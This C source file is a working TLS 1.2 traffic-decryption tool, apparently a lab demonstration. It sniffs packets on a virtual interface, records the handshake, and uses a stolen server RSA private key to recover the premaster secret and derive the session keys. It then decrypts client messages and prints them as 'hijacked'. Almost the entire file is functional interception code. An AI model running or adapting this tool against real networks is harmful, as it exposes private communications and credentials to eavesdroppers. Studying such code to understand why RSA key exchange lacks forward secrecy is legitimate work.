#include <stdarg.h>
#define _GNU_SOURCE
#define __USE_GNU
#include <sched.h>
#include <inttypes.h>

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>

#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>

#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/stat.h>

#include <linux/if.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/tcp.h>

#include <openssl/err.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/evp.h>
#include <openssl/x509.h>
#include <openssl/x509v3.h>
#include <openssl/kdf.h>
#include <openssl/core_names.h>

#define CONF_RING_FRAMES 2
#define FRAME_SIZE 2048
#define CONF_DEVICE "veth11"

#define PRIVKEY_PATH "./certs/server_priv.pem"

#define SOCK_PROTOCOL(ringtype) htons(ETH_P_ALL)
#define SOCKADDR_PROTOCOL htons(ETH_P_ALL)

#define TX_DATA_OFFSET TPACKET_ALIGN(sizeof(struct tpacket2_hdr))
#define RX_DATA_OFFSET TX_DATA_OFFSET + 34

uint8_t session_info[8129] = {0};
int session_info_len = 0;

uint8_t session_hash[32] = {0};

uint8_t client_random[32] = {0};
uint8_t server_random[32] = {0};

uint8_t premaster_raw[512] = {0};
uint8_t master[48] = {0};
uint8_t master_keymat[160] = {0};

uint8_t client_write_mac[32] = {0};
uint8_t server_write_mac[32] = {0};
uint8_t client_write_key[32] = {0};
uint8_t server_write_key[32] = {0};
uint8_t client_write_iv[16] = {0};
uint8_t server_write_iv[16] = {0};

EVP_PKEY* priv_key = NULL;

EVP_CIPHER* cipher;

uint8_t hacked_message[2048] = {0};


#define IVLEN 16

uint8_t stage = 0x01;

/*
 *  steal start
 *  https://github.com/openssl/openssl/blob/master/providers/implementations/kdfs/tls1_prf.c
 *
*/
static int tls1_prf_P_hash(EVP_MAC_CTX *ctx_init,
                           const unsigned char *sec, size_t sec_len,
                           const unsigned char *seed, size_t seed_len,
                           unsigned char *out, size_t olen)
{
    size_t chunk;
    EVP_MAC_CTX *ctx = NULL, *ctx_Ai = NULL;
    unsigned char Ai[EVP_MAX_MD_SIZE];
    size_t Ai_len;
    int ret = 0;

    if (!EVP_MAC_init(ctx_init, sec, sec_len, NULL))
        goto err;
    chunk = EVP_MAC_CTX_get_mac_size(ctx_init);
    if (chunk == 0)
        goto err;
    /* A(0) = seed */
    ctx_Ai = EVP_MAC_CTX_dup(ctx_init);
    if (ctx_Ai == NULL)
        goto err;
    if (seed != NULL && !EVP_MAC_update(ctx_Ai, seed, seed_len))
        goto err;

    for (;;) {
        /* calc: A(i) = HMAC_<hash>(secret, A(i-1)) */
        if (!EVP_MAC_final(ctx_Ai, Ai, &Ai_len, sizeof(Ai)))
            goto err;
        EVP_MAC_CTX_free(ctx_Ai);
        ctx_Ai = NULL;

        /* calc next chunk: HMAC_<hash>(secret, A(i) + seed) */
        ctx = EVP_MAC_CTX_dup(ctx_init);
        if (ctx == NULL)
            goto err;
        if (!EVP_MAC_update(ctx, Ai, Ai_len))
            goto err;
        /* save state for calculating next A(i) value */
        if (olen > chunk) {
            ctx_Ai = EVP_MAC_CTX_dup(ctx);
            if (ctx_Ai == NULL)
                goto err;
        }
        if (seed != NULL && !EVP_MAC_update(ctx, seed, seed_len))
            goto err;
        if (olen <= chunk) {
            /* last chunk - use Ai as temp bounce buffer */
            if (!EVP_MAC_final(ctx, Ai, &Ai_len, sizeof(Ai)))
                goto err;
            memcpy(out, Ai, olen);
            break;
        }
        if (!EVP_MAC_final(ctx, out, NULL, olen))
            goto err;
        EVP_MAC_CTX_free(ctx);
        ctx = NULL;
        out += chunk;
        olen -= chunk;
    }
    ret = 1;

 err:
    EVP_MAC_CTX_free(ctx);
    EVP_MAC_CTX_free(ctx_Ai);
    OPENSSL_cleanse(Ai, sizeof(Ai));
    return ret;
}
/*
 * steal end
*/

static int hijack_key(){

    int result = -1;

    int seed_len = 0;
    uint8_t seed[128] = {0};

    int label_len = 0;
    char* extended_master_secret = "extended master secret";
    char* key_expansion = "key expansion";
    EVP_MD_CTX* md = NULL;
    EVP_MAC_CTX *macctx = NULL;

    OSSL_PARAM params[2], *p = params;

    *p++ = OSSL_PARAM_construct_utf8_string(OSSL_KDF_PARAM_DIGEST,
        SN_sha256, strlen(SN_sha256));
    *p = OSSL_PARAM_construct_end();

    // kex + server + client

    RSA* rsa_priv_key = EVP_PKEY_get1_RSA(priv_key);

    int data_len = RSA_size(rsa_priv_key);

    unsigned char* dec_msg = (unsigned char*)malloc(RSA_size(rsa_priv_key));


    int dec_len = RSA_private_decrypt(
                data_len,
                (unsigned char*)premaster_raw,
                dec_msg,
                rsa_priv_key,
                RSA_PKCS1_PADDING
                );


    printf("declen: %d\n", dec_len);

    if(dec_len < 1){

        printf("rsa private decrypt failed: %d\n", dec_len);

        goto hijack_end;
    }

    md = EVP_MD_CTX_new();

    if(!EVP_DigestInit_ex(md, EVP_sha256(), NULL)) {
        printf("failed digest init\n");
        goto hijack_end;
    }

    if(!EVP_DigestUpdate(md, session_info, session_info_len)) {
        printf("digest update failed\n");
        goto hijack_end;
    }

    printf("session info len: %d\n", session_info_len);
    int hashlen = 0;

    if(!EVP_DigestFinal_ex(md, session_hash, &hashlen)) {
        printf("digest final\n");
        goto hijack_end;
    }

    printf("session_hash: %d\n", hashlen);

    for(int i = 0 ; i < hashlen; i++){

        printf("%02X", session_hash[i]);
    }
    printf("\n");

    label_len = strlen(extended_master_secret);

    memcpy(seed, extended_master_secret, label_len);
    memcpy(seed + label_len, session_hash, hashlen);

    seed_len = label_len + hashlen;

    printf("extended master secret: label + seedlen: %d\n", seed_len);

    EVP_MAC* mac = EVP_MAC_fetch(NULL, "HMAC", NULL);

    macctx = EVP_MAC_CTX_new(mac);

    EVP_MAC_CTX_set_params(macctx, params);

    int rt = tls1_prf_P_hash(macctx, dec_msg, dec_len, seed, seed_len, master, 48);

    if(rt != 1){
        printf("failed to get master secret\n");
        goto hijack_end;
    }

    printf("master: \n  ");

    for(int i = 0; i < 48; i++){
        printf("%02X", master[i]);
    }

    printf("\n");

    label_len = strlen(key_expansion);

    memcpy(seed, key_expansion, label_len);
    memcpy(seed + label_len, server_random, 32);
    memcpy(seed + label_len + 32, client_random, 32);

    seed_len = label_len + 64;

    printf("key expansion: label + seedlen: %d\n", seed_len);

    rt = tls1_prf_P_hash(macctx, master, 48, seed, seed_len, master_keymat, 160);

    if(rt != 1){
        printf("failed to get key expansion\n");
        goto hijack_end;
    }

    printf("master keymat: \n  ");

    for(int i = 0; i < 160; i++){
        printf("%02X", master_keymat[i]);
    }

    printf("\n");

    memcpy(client_write_mac, master_keymat, 32);
    memcpy(server_write_mac, master_keymat + 32, 32);
    memcpy(client_write_key, master_keymat + 64, 32);
    memcpy(server_write_key, master_keymat + 96, 32);
    memcpy(client_write_iv, master_keymat + 128, 16);
    memcpy(server_write_iv, master_keymat + 144, 16);

    result = 1;

hijack_end:

    if(rsa_priv_key != NULL){
        RSA_free(rsa_priv_key);
    }
    if(dec_msg != NULL){
        free(dec_msg);
    }

    if(md != NULL){
        EVP_MD_CTX_free(md);
    }

    if(macctx != NULL){

        EVP_MAC_CTX_free(macctx);
    }


    return result;
}

static int cbc256_decrypt(uint8_t* enc_msg, int enclen, uint8_t* cbc_key, uint8_t* cbc_iv, uint8_t* plain_msg){

    int plaintext_len;
    int outlen, rv;

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();


    rv = EVP_DecryptInit_ex(ctx, cipher, NULL, cbc_key, cbc_iv);

    if(rv != 1){
        printf("decrypt init\n");
        return -1;
    }

    rv = EVP_DecryptUpdate(ctx, plain_msg, &outlen, enc_msg, enclen);
    if(rv != 1){
        printf("decrypt update rv: %d\n", rv);
        return -1;
    }

    plaintext_len = outlen;

    rv = EVP_DecryptFinal(ctx, plain_msg + outlen, &outlen);    
    if(rv != 1){
        printf("decrypt final: %d\n", rv);
        return -1;
    }

    plaintext_len += outlen;
    EVP_CIPHER_CTX_free(ctx);

    return plaintext_len;

}


static void sniff_action(uint8_t* dataraw){

    struct tcphdr* tcp_header = (struct tcphdr*)dataraw;

    uint8_t* tcp_data = dataraw + 32;

    int client2server = 0;

    if(ntohs(tcp_header->dest) == 9999){

        client2server = 1;

    }


    uint16_t tmp = 0;
    uint16_t messagelen = 0;
    uint8_t iv[16] = {0};

    if(tcp_header->psh){

        switch(stage){

            case 0x01:
    
                if((*tcp_data & 0x16) && (*(tcp_data + 5) & stage)){
    
                    printf("handshake: client hello\n");
                } else {
                    break;
                }

                tmp = 0;
                messagelen = 0;

                memcpy(&tmp, tcp_data + 3, 2);

                messagelen = ntohs(tmp);

                memcpy(session_info + session_info_len, tcp_data + 5, messagelen);

                session_info_len += (int)messagelen;

                printf("slen: %d\n", session_info_len);

                memcpy(client_random, tcp_data + 11, 32);
    
                stage = 0x02;
    
                break;
    
            case 0x02:
    
                if((*tcp_data & 0x16) && (*(tcp_data + 5) & stage)){
    
                    printf("handshake: server hello\n");
                } else {
                    break;
                }

                tmp = 0;
                messagelen = 0;
                int hellolen = 0;
                int certlen = 0;

                memcpy(&tmp, tcp_data + 3, 2);

                messagelen = ntohs(tmp);

                memcpy(session_info + session_info_len, tcp_data + 5, messagelen);

                session_info_len += (int)messagelen;

                hellolen = (int)messagelen;

                tmp = 0;
                messagelen = 0;

                memcpy(&tmp, tcp_data + 5 + hellolen + 3, 2);

                messagelen = ntohs(tmp);

                memcpy(session_info + session_info_len, tcp_data + 5 + hellolen + 5, messagelen);

                session_info_len += (int)messagelen;

                certlen = (int)messagelen;

                tmp = 0;
                messagelen = 0;

                memcpy(&tmp, tcp_data + 5 + hellolen + 5 + certlen + 3, 2);

                messagelen = ntohs(tmp);

                memcpy(session_info + session_info_len, tcp_data + 5 + hellolen + 5 + certlen + 5, messagelen);

                session_info_len += (int)messagelen;

                memcpy(server_random, tcp_data + 11, 32);

                stage = 0x10;
    
                break;
    
            case 0x10:
    
                if((*tcp_data & 0x16) && (*(tcp_data + 5) & stage)){
    
                    printf("handshake: client key exchange\n");
                } else {
                    break;
                }

                tmp = 0;
                messagelen = 0;

                memcpy(&tmp, tcp_data + 3, 2);

                messagelen = ntohs(tmp);

                memcpy(session_info + session_info_len, tcp_data + 5, messagelen);

                session_info_len += (int)messagelen;

                memcpy(premaster_raw, tcp_data + 11, 512);
    
                int result = hijack_key();

                if(result < 0){
                    printf("hijack key failed: %d\n", result);
                    break;
                }

                stage = 0x04;
    
                break;
    
            case 0x04:
        
                if((*tcp_data & 0x16) && (*(tcp_data + 5) & stage)){
    
                    printf("handshake: new session ticket\n");
                } else {
                    break;
                }
    
                stage = 0x00;
    
                break;
    
            default:
            
                if(client2server && (*(tcp_data) & 0x17)){

                    memset(hacked_message, 0, 2048);
                    printf("message: ");
                    tmp = 0;
                    uint16_t payloadlen = 0;
                    memcpy(&tmp, tcp_data + 3, 2);
                    payloadlen = ntohs(tmp);

                    memcpy(iv, tcp_data + 5, 16);
                    printf("payloadlen: %d\n", payloadlen);
                    payloadlen -= 16; // iv
                    payloadlen -= 32; // mac

                    int decresult = cbc256_decrypt(tcp_data + 21, (int)payloadlen, client_write_key, iv, hacked_message);

                    if(decresult < 1){
                        printf("failed to decrypt message\n");
                    }else {
     
                        printf("    😈 TLSv1.2 hijacked message 😈\n");
                        printf("    \033[31m%s\033[0m\n", hacked_message);
                    }

                }
    
                break;
        }

    }


}

static void sniff_packet(void* packet){

    struct ethhdr *eth_header;
    struct iphdr *ip_header;
    uint8_t* data;
    struct in_addr ip_addr;

    eth_header = packet;
    ip_header = packet + sizeof(*eth_header);
    data = packet + sizeof(*eth_header) + sizeof(*ip_header);
    printf("dst mac: %02x:%02x:%02x:%02x:%02x:%02x\n", 
                eth_header->h_dest[0], 
                eth_header->h_dest[1], 
                eth_header->h_dest[2], 
                eth_header->h_dest[3], 
                eth_header->h_dest[4],
                eth_header->h_dest[5]
                );

    ip_addr.s_addr = ip_header->daddr;

    printf("dst address: %s\n", inet_ntoa(ip_addr));

    if(ip_header->protocol == IPPROTO_TCP){

        sniff_action(data);

    } 

    return;


}


static int init_ring_daddr(int fd, const char* ringdev, const int ringtype, struct sockaddr_ll* dest_daddr){

    struct ifreq ifr;
    int	ifindex;
    struct sockaddr_ll ring_daddr;
    // get device index
    strcpy(ifr.ifr_name, ringdev);
    if (ioctl(fd, SIOCGIFINDEX, &ifr)){
        printf("ioctl\n");
        return -1;
    }
    ifindex = ifr.ifr_ifindex;
    memset(&ring_daddr, 0, sizeof(ring_daddr));

    ring_daddr.sll_family = AF_PACKET;
    ring_daddr.sll_protocol = SOCKADDR_PROTOCOL;
    ring_daddr.sll_ifindex  = ifindex;

    memcpy(dest_daddr, &ring_daddr, sizeof(struct sockaddr_ll));

    return 0;
}




static char* init_packetsock_ring(int fd, int ringtype, struct sockaddr_ll* dest_daddr){

    struct tpacket_req tp;
    char* ring;
    int	packet_version = TPACKET_V2;

    if (setsockopt(fd, SOL_PACKET, PACKET_VERSION, &packet_version, sizeof(packet_version))){
        printf("setsockopt packet version");
        return NULL;
    }

    tp.tp_block_size = getpagesize();
    tp.tp_frame_size = FRAME_SIZE;
    tp.tp_frame_nr	 = CONF_RING_FRAMES;
    tp.tp_block_nr	 = (tp.tp_frame_nr * tp.tp_frame_size) / tp.tp_block_size;

    if (init_ring_daddr(fd, CONF_DEVICE, ringtype, dest_daddr)){
        printf("init ring\n");
        return NULL;
    }

    if (setsockopt(fd, SOL_PACKET, ringtype, (void*)&tp, sizeof(tp))){
        printf("setsockopt sol packet\n");
        return NULL;
    }

    ring = mmap(0, tp.tp_block_size * tp.tp_block_nr, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (ring == MAP_FAILED){
        printf("mmap failed\n");
        return NULL;
    }

    return ring;
}

static int init_packetsock(char** ring, int ringtype, struct sockaddr_ll* dest_daddr){

    int fd;
    fd = socket(PF_PACKET, SOCK_RAW, SOCK_PROTOCOL(ringtype));
    if (fd < 0){

        printf("failed to create socket \n");
        return fd;
    }

    if (ring){
        *ring = init_packetsock_ring(fd, ringtype, dest_daddr);


        if (!*ring){
            close(fd);
            return -1;
        }
    }

    return fd;
}

static int exit_packetsock(int fd, char* ring, int tx_mmap){

    if (tx_mmap && munmap(ring, CONF_RING_FRAMES * FRAME_SIZE)){
        printf("munmap failed\n");
        return -1;
    }

    close(fd);

    return 0;
}


static void* process_rx(const int fd, char* rx_ring, int* len){

    int ret;
    struct tpacket2_hdr* header;
    struct pollfd pollset;


    for (int i = 0; i < CONF_RING_FRAMES; i++){
        
        header = (void*)rx_ring + (i * FRAME_SIZE);
        assert((((unsigned long)header) & (FRAME_SIZE - 1)) == 0);

        if (header->tp_status != TP_STATUS_AVAILABLE){

            pollset.fd		= fd;
            pollset.events	= POLLIN;
            pollset.revents = 0;
            ret				= poll(&pollset, 1, 1);
        }


        if (header->tp_status & TP_STATUS_USER){
            if (header->tp_status & TP_STATUS_COPY){
                printf("copy\n");
                continue;
            }
            *len = header->tp_len;

            return (void*)header;
        }
    }
    return NULL;
}

static void process_rx_release(char* packet){

    struct tpacket2_hdr* header = (struct tpacket2_hdr*)packet;
    header->tp_status = TP_STATUS_KERNEL;

}

static void rx_flush(void* ring){
    for (int i = 0; i < CONF_RING_FRAMES; i++){
        struct tpacket2_hdr* hdr = ring + (i * FRAME_SIZE);
        hdr->tp_status = TP_STATUS_KERNEL;
    }
}


void do_serve(){

    char *rxRing, *pkt;
    int	  rxFd;
    int	  len;

    struct sockaddr_ll rxdest_daddr;

    rxFd = init_packetsock(&rxRing, PACKET_RX_RING, &rxdest_daddr);
    if (rxFd < 0){
        printf("failed to init rx packet sock\n");
        return;
    }

    

    if (bind(rxFd, (struct sockaddr*)&rxdest_daddr, sizeof(rxdest_daddr)) != 0){
        printf("bind rxfd\n");
        return;
    }


    int needs_flush = 0;
    int count = 0;
    while(1){

        pkt = NULL;

        while (pkt = process_rx(rxFd, rxRing, &len)){

            uint8_t* off = ((void*)pkt) + RX_DATA_OFFSET;
            printf("packet RX: %d \n", count);
            sniff_packet(off);
            printf("\n");
            process_rx_release(pkt);
            needs_flush = 1;
            count += 1;
            
        }

        if (needs_flush == 1){
            rx_flush(rxRing);
            needs_flush = 0;
        }

    }

    exit_packetsock(rxFd, rxRing, 1);

    return;
}


int main(){

    FILE* fp;

    printf("mitm using interface: %s\n", CONF_DEVICE);
    printf("mitm using privkey: %s\n", PRIVKEY_PATH);

    fp = fopen(PRIVKEY_PATH, "r");
    priv_key = PEM_read_PrivateKey(fp, NULL, NULL, NULL);
    fclose(fp);

    cipher = EVP_aes_256_cbc();

    do_serve();

    EVP_PKEY_free(priv_key);

    return 0;
}